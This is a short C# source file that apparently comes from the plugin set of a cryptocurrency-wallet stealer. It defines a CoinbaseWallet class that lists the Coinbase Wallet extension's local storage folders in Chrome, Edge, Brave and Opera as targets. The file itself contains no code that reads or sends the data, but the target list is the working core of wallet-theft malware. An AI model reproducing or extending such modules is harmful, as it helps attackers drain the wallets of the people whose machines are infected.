using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    // Coinbase Wallet - Popular wallet (2025)
    public class CoinbaseWallet : CryptoWalletBase
    {
        public CoinbaseWallet()
        {
            walletName = "CoinbaseWallet";
            
            // Coinbase Wallet browser extension paths
            // Extension ID: hnfanknocfeofbddgcijnmhnfnkdnaad
            walletPaths.Add("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad");
            walletPaths.Add("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad");
            walletPaths.Add("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad");
            walletPaths.Add("%APPDATA%\\Opera Software\\Opera Stable\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad");
        }
    }
}
